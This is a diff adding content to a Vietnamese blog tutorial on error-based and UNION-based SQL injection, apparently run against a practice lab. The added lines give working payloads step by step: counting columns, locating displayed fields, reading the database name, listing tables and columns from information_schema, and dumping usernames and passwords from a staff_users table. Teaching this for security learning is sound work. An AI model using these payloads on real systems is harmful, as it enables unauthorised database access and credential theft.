@@ -80,14 +80,41 @@ Với cấu trúc bảng trong CSDL:
         content TEXT
     ); 
 ```
-Giả sử web vẫn bật tính năng hiển thị lỗi (Error). Do vậy khi query với câu lệnh sai cú pháp thì lỗi vẫn hiển thị.
+Giả sử web vẫn bật tính năng hiển thị lỗi (Error). Do vậy khi query với câu lệnh sai cú pháp (Số cột lấy từ lệnh SELECT sau UNION không bằng số cột lấy từ lệnh trước UNION) thì lỗi vẫn hiển thị.
+
+Payload: ```1 UNION SELECT 1```
 
 ![sqli technical error base4]({{site.url}}/assets/img/2025/02/12/3-sqli-error-base4.png)
 
 Lỗi chỉ hết khi số lượng cột sau UNION bằng số cột trong câu lệnh SELECT ban đầu để câu lệnh SQL không bị lỗi cú pháp => Ta sẽ xác định được số cột cần thiết sau UNION.
 
-![sqli technical error base4]({{site.url}}/assets/img/2025/02/12/3-sql-injection-error-base5.png)
+Payload: ```1 UNION SELECT 1,2,3```
 
+![sqli technical error base5]({{site.url}}/assets/img/2025/02/12/3-sql-injection-error-base5.png)
+
+Cố gắng xác định vị trí hiển thị của dữ liệu lấy từ UNION
+
+Payload: ```0 UNION SELECT 1,2,3```
+
+![sqli technical error base6]({{site.url}}/assets/img/2025/02/12/3-sql-injection-error-base6.png)
+
+=> Ta có thể xác định vị trí hiển thị của từng phần của Payload với các giá trị 1,2,3.
+
+Tiếp tục lấy tên của CSDL
+
+Payload: ```0 UNION SELECT 1,2,database()```
+
+![sqli technical error base7]({{site.url}}/assets/img/2025/02/12/3-sql-injection-error-base7.png)
+
+Tiếp tục không khó để lấy tên các bảng của CSDL bằng một số Query sau:
+
+```sql
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+```
+
+Quá lợi hại phải không các bạn.
 
 # Blind SQLi
 
